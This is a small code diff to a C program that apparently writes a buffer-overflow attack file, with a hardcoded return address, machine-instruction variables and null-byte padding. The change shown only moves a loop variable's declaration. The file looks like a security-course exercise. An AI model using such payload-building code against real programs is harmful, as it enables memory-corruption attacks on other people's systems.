@@ -15,6 +15,7 @@
 int main() {
     FILE *psFile; 
     unsigned int MOV, STRB, ADR, B; 
+    int i; 
 
     const unsigned int returnAddress = 0x420078;
 
@@ -32,7 +33,7 @@ int main() {
     /* add padding so that buffer overflow can be performed 
     48 - 11 (length of name)= 37. 
     Also have to leave 16 bytes for 4 lines of code */ 
-    for (int i = 0; i < 21; i++) {
+    for (i = 0; i < 21; i++) {
         fputc(0x00, psFile);
     }
 
